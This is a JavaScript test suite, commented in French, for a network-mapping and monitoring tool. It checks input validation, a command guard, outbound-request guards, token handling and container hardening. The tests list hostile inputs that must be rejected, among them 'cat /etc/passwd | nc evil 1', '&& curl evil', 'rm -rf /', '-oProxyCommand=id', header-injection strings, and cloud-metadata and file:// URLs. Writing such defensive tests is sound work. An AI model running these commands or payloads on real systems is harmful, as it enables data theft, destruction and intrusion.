// Les briques, une à une : validation des cibles, garde des commandes,
// classement, registres, logos, tickets, mémoire, jetons, extensions, trafic,
// VLAN, commandes automatiques, assistant. Reprend les essais de la 1.4.1
// (garde, valider, registre, logos, ticket, mémoire, extensions, assistant).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { DatabaseSync } from 'node:sqlite';
import { estIPv4, estIP, estMAC, estCidr, estPort, estHote, exigerIP, validerCible, nettoyerNom, ValeurRefusee, enEntier, dansLeReseau, contenue, estPrivee, normaliserCidr } from '../src/cibles.js';
import { gardeCommande } from '../src/consoles.js';
import { classer } from '../src/classement.js';
import { analyserRdap, dansLePrefixe, adresseDeRegistre } from '../src/registre.js';
import { Logos, domaineValide } from '../src/logos.js';
import { Sortie, classer as classerAdresse, lireEntree } from '../src/sortie.js';
import { construireTicket, envoyerApi, marquer } from '../src/ticket.js';
import { Memoire, depuisAlerte, etiquettesDe } from '../src/memoire.js';
import { Jetons, empreinte } from '../src/jetons.js';
import { Extensions } from '../src/extensions.js';
import { lireConntrack, classerFlux, juger, domaineDe } from '../src/trafic.js';
import { plageUtilisable, verifierAdresse } from '../src/vlans.js';
import { rendre, passeFiltre } from '../src/commandes.js';
import { dedoublonner, aDire } from '../src/assistant/liaisons.js';
import { devine } from '../src/assistant/widgets.js';
import { passerLaMain } from '../src/assistant/index.js';
import { Executeur } from '../src/executeur.js';
import { Ssh, empreinteCle } from '../src/ssh.js';
import { exigerUrlEquipement } from '../src/adaptateurs/session.js';
import { lireConfigMapmylan } from '../src/config.js';
import { Reglages } from '../src/reglages.js';
import { Hote } from '../src/hote.js';
import { ouvrirBase } from '../src/db.js';
import { Appareils } from '../src/appareils.js';
import { dossierTemporaire, serveurLocal } from './aides.js';

test('valider : adresses, MAC, plages et ports ; les charges d’injection restent refusées', () => {
  assert.equal(estIPv4('192.0.2.10'), true);
  assert.equal(estIPv4('198.51.100.5'), true);
  for (const x of ['1.2.3.4; rm -rf /', '1.2.3.4 -j ACCEPT', '$(reboot)', '01.2.3.4', '256.1.1.1', '-oG /tmp/x']) assert.equal(estIPv4(x), false, x);
  assert.equal(estIP('fe80::1'), true);
  assert.equal(estIP('2001:db8::ff00:42:8329'), true);
  assert.equal(estMAC('AA:BB:CC:DD:EE:FF'), true);
  assert.equal(estMAC('aa-bb-cc-dd-ee-ff'), true);
  assert.equal(estMAC('zz:bb:cc:dd:ee:ff'), false);
  assert.equal(estCidr('192.0.2.0/24'), true);
  assert.equal(estCidr('198.51.100.0/33'), false);
  assert.equal(estCidr('$(reboot)'), false);
  assert.equal(estPort(22), true);
  assert.equal(estPort(70000), false);
  assert.equal(estPort(0), false);
  // Un nom d'hôte qui commence par un tiret serait lu comme une option.
  assert.equal(estHote('-oProxyCommand=id'), false);
  assert.equal(estHote('serveur-a.exemple.org'), true);
  assert.equal(exigerIP('192.0.2.5'), '192.0.2.5');
  assert.throws(() => exigerIP('1.2.3.4; echo pwned'), ValeurRefusee);
  assert.deepEqual(validerCible({ ip: '192.0.2.5', mac: 'aa:bb:cc:dd:ee:ff' }), { ip: '192.0.2.5', mac: 'AA:BB:CC:DD:EE:FF' });
  assert.throws(() => validerCible({ ip: '192.0.2.5 && curl evil' }), ValeurRefusee);
  assert.equal(nettoyerNom('host\r\nInjected'), 'hostInjected');
  assert.ok(nettoyerNom('a'.repeat(200)).length <= 63);
  assert.equal(nettoyerNom('camera\u200b-7'), 'camera-7', 'marque invisible retirée');
});

test('arithmétique des plages', () => {
  assert.equal(enEntier('0.0.0.0'), 0);
  assert.equal(enEntier('1.2.3.4'), 16909060);
  assert.equal(enEntier('255.255.255.255'), 4294967295);
  assert.equal(enEntier('1.2.3'), null);
  assert.equal(dansLeReseau('192.0.2.77', '192.0.2.0/24'), true);
  assert.equal(dansLeReseau('198.51.100.1', '192.0.2.0/24'), false);
  assert.equal(contenue('192.0.2.128/25', '192.0.2.0/24'), true);
  assert.equal(contenue('192.0.2.0/23', '192.0.2.0/24'), false);
  assert.deepEqual(normaliserCidr('192.0.2.1/24'), { reseau: '192.0.2.0/24', bits: 24 });
  assert.equal(estPrivee('127.0.0.1'), true);
  assert.equal(estPrivee('203.0.113.9'), false);
});

test('garde des commandes : une instruction, jamais deux', () => {
  const cmd = 'iptables -I FORWARD 1 -s 192.0.2.5 -j DROP';
  assert.equal(gardeCommande(cmd), cmd);
  for (const mal of ['ls; rm -rf /', 'a && b', 'a || b', 'cat /etc/passwd | nc evil 1', 'echo `id`', 'echo $(reboot)', 'printf x\nmalicious', 'echo x > /etc/y', 'cat < /etc/shadow']) {
    assert.throws(() => gardeCommande(mal), { status: 400 }, mal);
  }
  assert.throws(() => gardeCommande(''), { status: 400 });
  assert.throws(() => gardeCommande('a'.repeat(5000)), { status: 400 });
});

test('classement pondéré : la passerelle, les signaux forts, l’absence de signal', () => {
  assert.equal(classer({ isGateway: true, ports: [{ port: 445 }] }).type, 'router');
  const imprimante = classer({ vendor: 'Brother Industries', mdnsServices: ['_ipp._tcp'], ports: [{ port: 631 }] });
  assert.equal(imprimante.type, 'printer');
  assert.ok(imprimante.confidence > 0.6, JSON.stringify(imprimante));
  assert.ok(imprimante.reasons.length >= 2);
  assert.equal(classer({ vendor: 'Synology Incorporated' }).type, 'nas');
  assert.equal(classer({ vendor: 'Espressif Inc.' }).type, 'iot');
  assert.equal(classer({ mdnsServices: ['_rtsp._tcp'], hostname: 'camera-7' }).type, 'camera');
  assert.deepEqual(classer({}), { type: 'unknown', confidence: 0, reasons: [] });
});

test('registre : bornes d’un préfixe et lecture d’une fiche RDAP', () => {
  const f = { ip: '203.0.113.1', debut: enEntier('203.0.113.0'), fin: enEntier('203.0.113.255') };
  assert.equal(dansLePrefixe(f, '203.0.113.200'), true);
  assert.equal(dansLePrefixe(f, '203.0.114.1'), false);
  assert.equal(dansLePrefixe({ ip: '203.0.113.1' }, '203.0.113.1'), false, 'sans bornes, rien ne tombe dedans');
  const reponse = {
    startAddress: '198.51.100.0', endAddress: '198.51.100.255', name: 'EXEMPLE-NET',
    entities: [{ roles: ['registrant'], vcardArray: ['vcard', [['version', {}, 'text', '4.0'], ['fn', {}, 'text', 'Exemple Hébergement SAS'],
      ['adr', { label: '1 rue de l’Exemple\nExempleville\nFrance' }, 'text', ['', '', '', '', '', '', 'France']], ['email', {}, 'text', 'abuse@exemple.org']]] }],
  };
  const r = analyserRdap(reponse, '198.51.100.10');
  assert.equal(r.debut, enEntier('198.51.100.0'));
  assert.equal(r.reseau, 'EXEMPLE-NET');
  assert.equal(r.organisation, 'Exemple Hébergement SAS');
  assert.equal(r.pays, 'FR');
  assert.equal(r.domaine, 'exemple.org');
  assert.equal(analyserRdap({ name: 'SANS-BORNES' }, '198.51.100.10').debut, undefined);
  // Une adresse privée ne part jamais vers un registre.
  assert.equal(adresseDeRegistre('127.0.0.1'), false);
  assert.equal(adresseDeRegistre('203.0.113.7'), true);
});

test('logos : réglage éteint par défaut, une sortie par domaine, jamais de SVG ni de HTML', async () => {
  for (const d of ['exemple.org', 'sous.exemple.org', 'a-b.exemple.co.uk', 'xn--80ak6aa92e.com']) assert.equal(domaineValide(d), true, d);
  for (const d of ['', 'a', 'exemple', 'exa mple.org', 'exemple.org/chemin', 'exemple.org:8080', 'u@exemple.org', '../etc/passwd', 'http://exemple.org', '-exemple.org', '\nexemple.org', null, 'a'.repeat(250) + '.com']) {
    assert.equal(domaineValide(d), false, String(d));
  }
  const reglages = { valeur: undefined, lire() { return this.valeur; } };
  const appels = [];
  let reponse = () => new Response(new Uint8Array([1, 2, 3, 4]), { headers: { 'content-type': 'image/png' } });
  const sortie = new Sortie({ transport: async url => { appels.push(url.href); return reponse(url); } });
  const logos = new Logos({ sortie, reglages });
  assert.equal(logos.actifs(), false, 'éteint tant que le réglage n’est pas vrai');
  reglages.valeur = 'true';
  assert.equal(logos.actifs(), false);
  reglages.valeur = true;
  assert.equal(logos.actifs(), true);
  assert.equal((await logos.logo('exemple.org')).type, 'image/png');
  await logos.logo('exemple.org');
  assert.equal(appels.length, 1, 'le cache évite une seconde sortie');
  reponse = () => new Response('<svg onload="alert(1)"/>', { headers: { 'content-type': 'image/svg+xml' } });
  assert.equal(await logos.logo('svg.exemple.org'), null);
  reponse = () => new Response('<html></html>', { headers: { 'content-type': 'text/html' } });
  assert.equal(await logos.logo('page.exemple.org'), null);
  const avant = appels.length;
  assert.equal(await logos.logo('page.exemple.org'), null);
  assert.equal(appels.length, avant, 'l’absence aussi est gardée');
});

test('garde de sortie : classes d’adresses et liste des destinations internes', async () => {
  assert.equal(classerAdresse('169.254.169.254'), 'interdite');
  assert.equal(classerAdresse('100.100.100.200'), 'interdite');
  assert.equal(classerAdresse('127.0.0.1'), 'interne');
  assert.equal(classerAdresse('::ffff:127.0.0.1'), 'interne');
  assert.equal(classerAdresse('192.0.2.1'), 'interdite', 'plage de documentation');
  assert.equal(classerAdresse('203.0.114.1'), 'publique');
  assert.throws(() => lireEntree('8.8.8.8'), /privées/);
  assert.throws(() => lireEntree('127.0.0.0/4'), /large/);
  assert.deepEqual(lireEntree('billets.exemple.org'), { type: 'nom', nom: 'billets.exemple.org' });
  const locale = await serveurLocal((req, res) => res.end('{}'));
  try {
    let internes = [];
    const sortie = new Sortie({ internes: () => internes });
    await assert.rejects(sortie.sortir(`${locale.url}/`), /destination interne non autorisée/);
    await assert.rejects(sortie.sortir('http://169.254.169.254/latest/meta-data'), /toujours refusée/);
    await assert.rejects(sortie.sortir('file:///etc/passwd'), /Schéma refusé/);
    await assert.rejects(sortie.sortir(`http://utilisateur:secret@127.0.0.1:${locale.port}/`), /Identifiants/);
    internes = ['127.0.0.1'];
    assert.equal((await sortie.sortir(`${locale.url}/`)).status, 200);
    await assert.rejects(sortie.sortir(`${locale.url}/`, {}, { confiance: 'publique' }), /adresse privée/);
  } finally { await locale.fermer(); }
});

test('tickets : titre sans en-tête injecté, urgence jamais relevée, API de billetterie gardée', async () => {
  const t = construireTicket('hote_inconnu', { hote: 'evil\r\nBcc: attaquant@exemple.org', ip: '192.0.2.5' });
  assert.doesNotMatch(t.titre, /[\r\n]/);
  assert.notEqual(construireTicket('hote_inconnu', { hote: 'h', ip: '192.0.2.5', urgence: 'p1' }).urgence, 'p1');
  assert.equal(construireTicket('equipement_injoignable', { urgence: 'p4' }).urgence, 'p4');
  assert.deepEqual(Object.keys(marquer(t, 'ticket_v1')).slice(0, 1), ['ticket_v1']);
  const sortie = new Sortie();
  assert.match((await envoyerApi(sortie, t, { url: 'http://169.254.169.254/latest/meta-data' })).erreur, /toujours refusée/);
  assert.match((await envoyerApi(sortie, t, { url: 'http://203.0.114.10/api' })).erreur, /https exigé/);
  assert.match((await envoyerApi(sortie, t, { url: 'http://u:p@127.0.0.1/api' })).erreur, /Identifiants/);
});

test('mémoire : les alertes partent à SYNAPSE par lots, avec des étiquettes sûres', async () => {
  assert.deepEqual(etiquettesDe({ etiquettes: ['Essai', 'bad tag', 'x'.repeat(40), 'ok-2', 'a', 'b', 'c'] }), ['essai', 'ok-2', 'a', 'b']);
  assert.deepEqual(etiquettesDe(null), []);
  const e = depuisAlerte({ id: 'z', severity: 'critical', source: 'scanner', message: 'CVE', metadata: { etiquettes: ['essai'] } });
  assert.equal(e.kind, 'incident.network');
  assert.deepEqual(e.tags, ['alerte', 'critical', 'essai']);
  const synapse = await serveurLocal((req, res) => { res.setHeader('content-type', 'application/json'); res.end('{"ok":true}'); });
  try {
    const m = new Memoire({ url: synapse.url, jeton: 'cer_mapmylan_essai' });
    m.surAlerte({ id: 'a1', severity: 'high', source: 'scanner', message: 'Port 23 ouvert sur camera-7' });
    m.surBalayage({ hostsFound: 12 });
    m.surBalayage({ hostsFound: 12 });
    await m.vider();
    assert.equal(synapse.recues.length, 1);
    const lot = JSON.parse(synapse.recues[0].corps).events;
    assert.equal(lot.length, 2, 'le balayage identique n’est raconté qu’une fois');
    assert.equal(synapse.recues[0].entetes.authorization, 'Bearer cer_mapmylan_essai');
    assert.equal(m.public().envoyes, 2);
    m.arreter();
  } finally { await synapse.fermer(); }
  const muette = new Memoire({});
  muette.surAlerte({ id: 'x', severity: 'low', source: 's', message: 'm' });
  assert.equal(muette.public().enAttente, 0, 'sans SYNAPSE, rien n’est gardé');
});

test('jetons d’intégration : empreinte seule en base, révocation, expiration, amorce du Hub', () => {
  const db = ouvrirBase(dossierTemporaire());
  db.exec("CREATE TABLE IF NOT EXISTS socle_comptes(id TEXT PRIMARY KEY)");
  const j = new Jetons(db);
  const { ligne, clair } = j.creer({ name: 'script', role: 'lecture' });
  assert.match(clair, /^mml_[\w-]{40,}$/);
  assert.equal(ligne.hash, empreinte(clair));
  assert.ok(!JSON.stringify(db.prepare('SELECT * FROM jetons_integration').all()).includes(clair), 'le clair n’est jamais gardé');
  assert.equal(j.verifier(clair).ok, true);
  assert.equal(j.verifier(clair.slice(0, -1) + (clair.at(-1) === 'A' ? 'B' : 'A')).raison, 'inconnu');
  assert.equal(j.verifier('Bearer x').raison, 'forme');
  j.revoquer(ligne.id);
  assert.equal(j.verifier(clair).raison, 'revoque');
  const expire = j.creer({ name: 'court', role: 'membre', expiresAt: Date.now() - 1 });
  assert.equal(j.verifier(expire.clair).raison, 'expire');
  const graine = 'hub_' + 'g'.repeat(40);
  assert.equal(j.amorcer(graine).fait, 'cree');
  assert.equal(j.amorcer(graine).fait, 'inchange');
  assert.equal(j.verifier(graine).jeton.role, 'membre');
  assert.equal(j.amorcer('hub_' + 'h'.repeat(40)).fait, 'mis-a-jour');
  assert.equal(j.verifier(graine).ok, false, 'l’ancienne graine ne vaut plus');
  db.close();
});

test('extensions : chargées si sûres, ignorées sinon, jamais bloquantes', async () => {
  const d = dossierTemporaire();
  fs.writeFileSync(path.join(d, 'bonne.mjs'), 'export default { nom: "bonne", vus: [], surAlerte(a) { this.vus.push(a.id); } };', { mode: 0o644 });
  fs.writeFileSync(path.join(d, 'ancienne.cjs'), 'module.exports = { nom: "ancienne", surBalayage() { throw new Error("boum"); } };', { mode: 0o644 });
  fs.writeFileSync(path.join(d, 'ouverte.mjs'), 'export default { nom: "ouverte" };');
  fs.chmodSync(path.join(d, 'ouverte.mjs'), 0o666);
  fs.symlinkSync(path.join(d, 'bonne.mjs'), path.join(d, 'lien.mjs'));
  fs.writeFileSync(path.join(d, '_brouillon.mjs'), 'throw new Error("jamais chargé")', { mode: 0o644 });
  const notes = [];
  const e = new Extensions({ journal: (niveau, m) => notes.push(`${niveau} ${m}`) });
  await e.charger(d);
  assert.equal(e.nombre, 2);
  assert.ok(notes.some(n => /ouverte\.mjs ignorée : inscriptible/.test(n)));
  assert.ok(notes.some(n => /lien\.mjs ignorée : lien symbolique/.test(n)));
  e.alerte({ id: 'a7' });
  e.balayage({ hotes: 3 });
  assert.deepEqual(e.chargees.find(x => x.nom === 'bonne').vus, ['a7']);
  assert.ok(notes.some(n => /ancienne : boum/.test(n)));
  await new Extensions().charger(path.join(d, 'absent'));
});

test('trafic : conntrack lu dans les deux sens, jugements expliqués', () => {
  const locale = ip => ip.startsWith('192.0.2.');
  const sortant = lireConntrack('ipv4 2 tcp 6 431999 ESTABLISHED src=192.0.2.20 dst=203.0.113.9 sport=51000 dport=443 packets=10 bytes=4000 src=203.0.113.9 dst=198.51.100.1 sport=443 dport=51000 packets=8 bytes=9000 [ASSURED]');
  assert.deepEqual(classerFlux(sortant, locale), { proto: 'tcp', octets: 13000, paquets: 18, src: '192.0.2.20', dst: '203.0.113.9', port: 443, direction: 'sortant' });
  const entrant = lireConntrack('tcp 6 300 ESTABLISHED src=203.0.113.50 dst=198.51.100.1 sport=40000 dport=22 src=192.0.2.30 dst=203.0.113.50 sport=22 dport=40000');
  const f = classerFlux(entrant, locale);
  assert.equal(f.direction, 'entrant');
  assert.equal(f.port, 22);
  assert.match(juger(f, {}).raison, /SSH \(port 22\) atteint depuis l’extérieur/);
  assert.equal(juger({ direction: 'sortant', port: 443 }, { status: 'banned' }).suspect, true);
  assert.equal(juger({ direction: 'sortant', port: 443 }, { dangerScore: 10 }).suspect, false);
  assert.equal(lireConntrack('ligne sans rien'), null);
  assert.equal(domaineDe('cdn-1.exemple.co.uk'), 'exemple.co.uk');
  assert.equal(domaineDe('api.exemple.org.'), 'exemple.org');
});

test('VLAN : plage attribuable et adresses réservables', () => {
  assert.deepEqual(plageUtilisable('198.51.100.0/24'), { reseau: '198.51.100.0', diffusion: '198.51.100.255', premiere: '198.51.100.1', derniere: '198.51.100.254', bits: 24, octetsFiges: 3, prefixe: '198.51.100' });
  assert.equal(verifierAdresse('198.51.100.20', '198.51.100.0/24', '198.51.100.1').ok, true);
  assert.match(verifierAdresse('198.51.100.1', '198.51.100.0/24', '198.51.100.1').raison, /passerelle/);
  assert.match(verifierAdresse('198.51.100.255', '198.51.100.0/24').raison, /diffusion/);
  assert.match(verifierAdresse('192.0.2.4', '198.51.100.0/24').raison, /hors de/);
  assert.match(verifierAdresse('-oG', '198.51.100.0/24').raison, /n’est pas une adresse/);
});

test('commandes automatiques : gabarit rendu en texte, filtres', () => {
  assert.equal(rendre('Nouvel appareil {{ip}} ({{hostname}})', { ip: '192.0.2.9', hostname: '<b>{{ip}}</b>' }), 'Nouvel appareil 192.0.2.9 (<b>{{ip}}</b>)', 'une valeur n’est jamais réinterprétée');
  assert.equal(passeFiltre({ minScore: 60 }, { score: 40 }), false);
  assert.equal(passeFiltre({ minScore: 60 }, { score: 80 }), true);
  assert.equal(passeFiltre({ contains: 'camera' }, { name: 'CAMERA-7' }), true);
  assert.equal(passeFiltre(null, {}), true);
});

test('assistant : boucle coupée, texte à dire, widgets bornés, main passée sans lien dangereux', () => {
  assert.equal(dedoublonner('Bonjour.\n- a\n- b\n- a\n- a\n- c'), 'Bonjour.\n- a\n- b');
  assert.equal(aDire('Voici :\n- **routeur** en ligne\n- imprimante hors ligne'), 'Voici : routeur en ligne. imprimante hors ligne.');
  assert.equal(devine('état, nouveaux, alertes et risques').length, 2);
  assert.equal(devine('tableau de bord : nouveaux, alertes, risques').length, 3);
  const o = { action: true, cerveaux: [{ nom: 'hub', titre: 'Hub — automatisations', score: 6, action: { nom: 'workflow', ou: 'Hub → Assistant' }, ui: 'javascript:alert(1)' }] };
  const r = passerLaMain('crée un workflow', o, 'mapmylan');
  assert.equal(r.nom, 'hub');
  assert.equal(r.lien, null, 'une adresse qui n’est pas http(s) ne devient pas un lien');
  assert.equal(passerLaMain('qui est en ligne ?', { action: false, cerveaux: o.cerveaux }, 'mapmylan'), null);
});

test('exécution : programmes admis seulement, arguments en tableau, jamais de shell', async () => {
  const vus = [];
  const x = new Executeur({ lancer: (p, a, o, cb) => { vus.push({ p, a, o }); cb(null, 'ok', ''); } });
  await assert.rejects(x.executer('sh', ['-c', 'id']), /non admis/);
  await assert.rejects(x.executer('nmap', '-sn 192.0.2.0/24'), /arguments invalides/);
  await assert.rejects(x.executer('nmap', ['a\0b']), /arguments invalides/);
  assert.deepEqual(await x.executer('ping', ['-c', '1', '--', '192.0.2.1']), { stdout: 'ok', stderr: '', code: 0 });
  assert.equal(vus[0].o.shell, false);
  assert.deepEqual(Object.keys(vus[0].o.env).sort(), ['LANG', 'PATH'], 'rien du processus parent ne passe aux outils');
  // SSH : l'hôte et l'identifiant ne deviennent jamais des options.
  const ssh = new Ssh({ executeur: x });
  await assert.rejects(ssh.lireCles({ host: '-oProxyCommand=id', port: 22 }), { status: 400 });
  await assert.rejects(ssh.executer({ host: '192.0.2.1', port: 22, username: '-oProxyCommand=id', cleHote: { type: 'ssh-ed25519', cle: 'AAAA' } }, 'uname'), { status: 400 });
  await assert.rejects(ssh.executer({ host: '192.0.2.1', port: 22, username: 'admin' }, 'uname'), /Aucune clé d’hôte épinglée/);
  assert.match(empreinteCle('AAAAC3NzaC1lZDI1NTE5'), /^SHA256:[A-Za-z0-9+/]{43}$/);
});

test('API d’un équipement : l’origine seule, et l’hôte déclaré seulement', () => {
  assert.equal(exigerUrlEquipement('https://192.0.2.1:8443', '192.0.2.1'), 'https://192.0.2.1:8443');
  assert.throws(() => exigerUrlEquipement('http://192.0.2.1', '192.0.2.1'), /https exigé/);
  assert.throws(() => exigerUrlEquipement('https://169.254.169.254', '192.0.2.1'), /l’hôte doit être celui de l’équipement/);
  assert.throws(() => exigerUrlEquipement('https://192.0.2.1/api?x=1', '192.0.2.1'), /l’origine seule/);
});

test('configuration invalide : tout est listé, rien ne démarre', () => {
  const e = (() => { try { lireConfigMapmylan({ SCAN_SUBNET: '192.0.2.0/99', PORT: 'quatre', INTEGRATION_TOKEN_SEED: 'x'.repeat(40), VOX_JETON: 'court', POSTE_URL: 'http://relais.exemple.org' }); } catch (err) { return err; } })();
  assert.ok(e, 'la configuration aurait dû être refusée');
  const tout = e.erreurs.join('\n');
  for (const nom of ['SCAN_SUBNET', 'PORT', 'VOX_JETON', 'POSTE_URL']) assert.match(tout, new RegExp(nom), nom);
  const graine = (() => { try { lireConfigMapmylan({ INTEGRATION_TOKEN_SEED: 'x'.repeat(40) }); } catch (err) { return err; } })();
  assert.match(graine.message, /INTEGRATION_TOKEN_SEED/);
  const secret = dossierTemporaire();
  fs.writeFileSync(path.join(secret, 'vox'), 'jeton-vox-venu-d-un-fichier-0123\n');
  assert.equal(lireConfigMapmylan({ VOX_JETON_FILE: path.join(secret, 'vox') }).voxJeton, 'jeton-vox-venu-d-un-fichier-0123');
});

test('machine hôte : cœurs de l’hôte, disque libre, cartes et leur rôle', async () => {
  const proc = dossierTemporaire();
  fs.writeFileSync(path.join(proc, 'stat'), 'cpu  10 0 10 80 0 0 0 0 0 0\ncpu0 5 0 5 40 0 0 0 0 0 0\ncpu1 5 0 5 40 0 0 0 0 0 0\ncpu2 1 0 1 1 0 0 0 0 0 0\ncpu3 1 0 1 1 0 0 0 0 0 0\nintr 0\n');
  const carte = (address, cidr, family = 'IPv4', internal = false) => ({ address, cidr, family, internal, netmask: '', mac: '00:00:00:00:00:00' });
  const cartes = () => ({
    lo: [carte('127.0.0.1', '127.0.0.1/8', 'IPv4', true)],
    eth0: [carte('fe80::1', 'fe80::1/64', 'IPv6'), carte('192.0.2.2', '192.0.2.2/24')],
    eth1: [carte('198.51.100.7', '198.51.100.7/24')],
    docker0: [carte('203.0.113.1', '203.0.113.1/24')],
    veth7: [carte('fe80::7', 'fe80::7/64', 'IPv6')],
  });
  const hote = new Hote({ cfg: { proc, sys: proc }, db: null, plages: () => ['192.0.2.0/24'], cartes });
  const m = await hote.mesures();
  assert.equal(m.cores, 4, 'les lignes cpuN, pas la ligne « cpu » du total');
  assert.equal(typeof m.diskFreeGB, 'number');
  assert.ok(m.diskFreeGB >= 0);
  assert.deepEqual(m.interfaces, [
    { name: 'lo', address: '127.0.0.1/8', internal: true, role: 'boucle locale' },
    { name: 'eth0', address: '192.0.2.2/24', internal: false, role: 'balayage' },
    { name: 'eth1', address: '198.51.100.7/24', internal: false, role: 'autre' },
    { name: 'docker0', address: '203.0.113.1/24', internal: false, role: 'pont de conteneurs' },
  ], 'l’IPv4 d’abord ; une carte au seul lien local IPv6 n’apparaît pas');
  const choisie = new Hote({ cfg: { proc, sys: proc, interfaceScan: 'eth1' }, db: null, cartes });
  assert.equal(choisie.interfaces().find(c => c.name === 'eth1').role, 'balayage', 'SCAN_INTERFACE désigne la carte de balayage');
  assert.equal(new Hote({ cfg: { proc: dossierTemporaire(), sys: proc }, db: null, cartes: () => ({}) }).coeurs(), null, '/proc illisible : inconnu, pas zéro');
});

test('réglages : clés connues seulement, valeurs contrôlées', () => {
  const r = new Reglages(new DatabaseSync(':memory:'));
  r.db.exec('CREATE TABLE reglages (key TEXT PRIMARY KEY, value TEXT NOT NULL, updatedAt INTEGER NOT NULL)');
  assert.throws(() => r.ecrire('jwt.secret', 'x'), /Réglage inconnu/);
  assert.throws(() => r.ecrire('scan.ranges', [{ cidr: '198.51.0.0/8' }]), /CIDR/);
  assert.throws(() => r.ecrire('scan.interval', 5), { status: 400 });
  assert.throws(() => r.ecrire('sortie.autorisees', ['8.8.8.8']), /privées/);
  assert.deepEqual(r.ecrire('scan.ranges', [{ cidr: '198.51.100.0/24', label: 'bureau' }]), [{ cidr: '198.51.100.0/24', label: 'bureau' }]);
  assert.deepEqual(r.lire('scan.ranges'), [{ cidr: '198.51.100.0/24', label: 'bureau' }]);
  // Le point d'observation du globe, dans la forme que la page lit.
  assert.equal(r.ecrire('world.origin', '12.5,-45.25,Observatoire'), '12.5,-45.25,Observatoire');
  assert.equal(r.ecrire('world.origin', '-33.9 , 151.2'), '-33.9 , 151.2');
  for (const faux of ['91,0', '0,181', 'nord,est', '0,0,\nligne', '0,0,' + 'x'.repeat(61), '']) assert.throws(() => r.ecrire('world.origin', faux), { status: 400 }, faux);
});

test('ports d’un appareil : un relevé interrompu laisse les ports d’avant', () => {
  const db = ouvrirBase(dossierTemporaire());
  const appareils = new Appareils(db);
  const d = appareils.creer({ ip: '192.0.2.5', mac: '02:00:00:00:00:05' });
  appareils.remplacerPorts(d.id, [{ port: 22, protocol: 'tcp', state: 'open', service: 'ssh' }]);
  assert.throws(() => appareils.remplacerPorts(d.id, [{ port: 80, protocol: 'tcp', state: 'open' }, { port: 81, protocol: {}, state: 'open' }]));
  assert.deepEqual(db.prepare('SELECT port FROM ports WHERE deviceId = ?').all(d.id).map(p => p.port), [22]);
  db.close();
});


test('conteneur : NET_RAW seule pour MapMyLAN, sans élévation possible, dans les deux manifestes et l’image', () => {
  const lire = f => fs.readFileSync(path.join(import.meta.dirname, '..', f), 'utf8');
  for (const f of ['docker-compose.yml', 'deploy/compose.hub.yml']) {
    const bloc = /^ {2}(?:mapmylan|api):\n([\s\S]*?)(?=^ {2}\S)/m.exec(lire(f))[1];
    assert.match(bloc, /^ {4}cap_drop: \[ALL\]$/m, f);
    assert.match(bloc, /^ {4}cap_add: \[NET_RAW, SETUID, SETGID, SETPCAP\]$/m, f);
    assert.match(bloc, /^ {4}security_opt: \["no-new-privileges:true"\]$/m, f);
    assert.match(bloc, /^ {4}cpus: /m, f);
    // Root au lancement seulement : setpriv passe à node et ne garde que NET_RAW.
    const entree = JSON.parse(/^ {4}entrypoint: (\[.*\])$/m.exec(bloc)[1]);
    assert.deepEqual(entree.filter(a => /^--(reuid|regid|inh-caps|ambient-caps|bounding-set)=/.test(a)),
      ['--reuid=node', '--regid=node', '--inh-caps=-all,+net_raw', '--ambient-caps=-all,+net_raw', '--bounding-set=-all,+net_raw'], f);
    // Compose efface le CMD de l'image dès qu'un entrypoint est posé : sans
    // commande redite, setpriv part sans programme et le conteneur boucle.
    const commande = /^ {4}command: (\[.*\])$/m.exec(bloc);
    assert.ok(commande, `${f} : commande absente`);
    assert.deepEqual(JSON.parse(commande[1]), JSON.parse(/^CMD (\[.*\])$/m.exec(lire('Dockerfile'))[1]), f);
  }
  assert.deepEqual(JSON.parse(lire('hub.json')).permissions.capAdd, ['NET_RAW', 'SETUID', 'SETGID', 'SETPCAP']);
  assert.doesNotMatch(lire('Dockerfile'), /setcap|NET_ADMIN/);
  assert.match(lire('Dockerfile'), /^USER node$/m);
});

test('poste : la clé d’envoi part en Authorization (jeton d’envoi de CODMAIL) et en x-poste-key, objet sur une ligne', async () => {
  const { Poste } = await import('../src/poste.js');
  const vus = [];
  const p = new Poste({
    cfg: { posteUrl: 'https://courrier.exemple/api/send', posteDe: 'alertes@exemple.fr', posteCle: 'cmd_' + 'k'.repeat(40) },
    evts: { journaliser() {} },
    fetch: async (url, o) => { vus.push({ url, o }); return new Response(JSON.stringify({ ok: true, messageId: '<a@b>' }), { status: 200 }); },
  });
  const r = await p.envoyer({ objet: 'Hôte\r\nBcc: x@y.fr', corps: 'texte', machine: 'srv01' });
  assert.equal(r.ok, true);
  assert.equal(vus[0].o.headers.authorization, 'Bearer cmd_' + 'k'.repeat(40));
  assert.equal(vus[0].o.headers['x-poste-key'], 'cmd_' + 'k'.repeat(40));
  assert.doesNotMatch(JSON.parse(vus[0].o.body).subject, /[\r\n]/);
});
